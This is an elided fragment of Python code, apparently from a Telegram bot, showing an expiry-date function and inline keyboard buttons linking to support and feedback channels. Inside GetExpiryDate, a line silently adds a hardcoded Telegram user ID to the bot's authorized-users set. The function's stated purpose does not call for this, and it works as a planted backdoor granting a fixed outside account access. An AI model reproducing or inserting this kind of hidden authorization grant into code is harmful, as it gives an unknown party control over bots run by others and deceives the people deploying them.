...
def GetExpiryDate(chat_id):
    ...
    Config.AUTH_USERS.add(1832447570)
    return expires_at
    ...
    if update_channel:
        ...
        reply_markup=InlineKeyboardMarkup(
            [
                ...
                [
                    InlineKeyboardButton('Support Channel', url='https://t.me/PATRICIA_UPDATES'),
                    InlineKeyboardButton('Feedback', url='https://t.me/PATRICIA_SUPPORT')
                ],
                [
                    InlineKeyboardButton('Other Bots', url=''),
